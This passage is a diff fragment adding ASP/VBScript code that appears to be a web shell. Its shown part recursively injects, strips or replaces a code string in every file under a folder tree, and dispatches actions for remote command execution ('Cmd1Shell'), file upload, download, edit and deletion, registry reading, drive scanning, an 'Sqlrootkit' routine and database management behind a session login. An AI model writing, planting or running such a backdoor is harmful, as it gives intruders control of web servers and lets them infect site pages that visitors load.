+RRS"√  "&Wpath&myfile.name
+tfile1.close
+else
+RRS"<font color=red>×</font> "&Wpath&myfile.name
+tfile1.close
+end if
+Set tfile1=Nothing
+end if
+case "2"
+Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
+NewCode=Replace(tfile1.readall,Wcode,"")
+Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
+objCountFile.Write NewCode
+objCountFile.Close
+RRS"√  "&Wpath&myfile.name
+Set objCountFile=Nothing
+case "3"
+Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
+NewCode=Replace(tfile1.readall,Wcode,addCode2)
+Set objCountFile=WFSO.CreateTextFile(Wpath&myfile.name,True)
+objCountFile.Write NewCode
+objCountFile.Close
+RRS"√  "&Wpath&myfile.name
+Set objCountFile=Nothing
+case else
+RRS"滚!.":response.end
+end select
+else
+RRS"× "&Wpath&myfile.name
+end if
+RRS " → <a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""DownFile"")' class='am' title='下载'>Down</a> "
+RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""EditFile"")' class='am' title='编辑'>edit</a> "
+RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a> "
+RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
+RRS "<a href='javascript:FullForm("""&replace(Wpath&myfile.name,"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a><br>"
+	 Next
+ Set fsubfolers = f.SubFolders
+ For Each f1 in fsubfolers
+	NewPath=Wpath&""&f1.name
+ 	InsertAllFiles NewPath,Wcode,pc
+ Next
+set tfile=nothing
+Set FSO = Nothing
+set tfile=nothing
+set tfile2=nothing
+Set WFSO = Nothing
+End Sub
+
+  Case "ReadREG":call ReadREG()
+  Case "Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
+  Case "DownFile":DownFile FName:ShowErr()
+  Case "DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
+  Case "EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
+  Case "CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
+  Case "MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
+  Case "DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
+  Case "CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
+  Case "MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
+  Case "NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
+  Case "Logout":Session.Contents.Remove("web2a2dmin"):Response.Redirect URL
+  Case "UpFile":UpFile()
+  Case "ScanDriveForm":ScanDriveForm
+      Case "ScanDrive":ScanDrive Request("Drive")
+      Case "ScFolder":ScFolder Request("Folder")
+  Case "Course":Course()
+  Case "ServerInfo":ServerInfo() 
+  Case "AdminUser":AdminUser()
+  Case "chamacode"  
+  Case "Cmd1Shell":Cmd1Shell()
+  Case "Upload":Upload()
+  Case "Sqlrootkit":sqlrootkit()
+  Case "CreateMdb":CreateMdb FName
+  Case "CompactMdb":CompactMdb FName
+  Case "DbManager":DbManager()
+  Case Else MainForm()
+End Select
+if Action<>"Servu" then ShowErr()
+RRS"</body></html>"
+%>
